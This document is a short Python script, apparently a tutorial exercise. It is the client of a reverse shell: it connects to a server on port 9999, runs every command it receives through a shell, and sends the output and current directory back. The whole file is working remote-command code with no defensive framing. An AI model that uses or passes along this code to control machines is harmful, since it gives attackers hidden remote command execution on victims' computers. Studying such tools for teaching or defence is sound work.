#!/usr/bin/env python3
import socket
import subprocess
import sys
import os

"""
Client Functions
1.) Try and connect to our server
2.) Wait for our instructions
3.) Receives the Instructions and runs them
4.) Takes the result and sends them back to the server
"""

host = ''  # Private IP of the client
my_socket = socket.socket()
port = 9999  # Same as the server port number
my_socket.connect((host, port))

while 1:
    data = my_socket.recv(1024)
    if data[:2].decode('utf-8') == 'cd':
        os.chdir(data[3:].decode('utf-8'))
    if len(data) > 0:
        cmd = subprocess.Popen(data[:].decode('utf-8'), shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
        output_byte = cmd.stdout.read() + cmd.stderr.read()  # Reads output in bytes
        output_str = str(output_byte, 'utf-8')  # Converts Output from bytes to string
        print("Output in string: {}".format(output_str))
        current_working_dir = os.getcwd() + '>>'
        my_socket.send(str.encode(output_str + current_working_dir))
